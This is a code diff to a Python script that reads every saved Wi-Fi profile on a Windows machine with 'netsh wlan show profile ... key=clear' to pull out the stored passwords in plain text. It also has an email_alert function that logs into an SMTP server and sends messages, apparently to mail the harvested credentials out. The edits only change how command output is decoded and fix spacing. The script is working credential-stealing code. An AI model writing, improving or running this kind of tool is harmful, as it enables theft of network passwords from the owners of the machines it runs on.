@@ -24,15 +24,18 @@ print("Please wait this might take a while")
 dictionary = []
 
 # run the command netsh wlan show profiles and decode the results in utf-8 decoder
-data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
+# data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
+bytesData = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE)
+data = "".join(map(chr, bytesData.stdout)).split('\n')
 
 # put every profiles saved from the pc to a profiles list
 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 
 for i in profiles:
     # run the command to gain the password from the pc to the results
-    results = subprocess.check_output(
-        ['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp850').split('\n')
+    # results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp850').split('\n')
+    bytesResults = subprocess.run(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], stdout=subprocess.PIPE)
+    results = "".join(map(chr, bytesResults.stdout)).split('\n')
 
     for a in results:
 
@@ -96,7 +99,7 @@ def email_alert(subject, body, to):
     # connect securely to server
     server.starttls()
     # login using assigned user and password
-    server.login(user,password)
+    server.login(user, password)
     # send email
     server.send_message(msg)
     # quit the email server
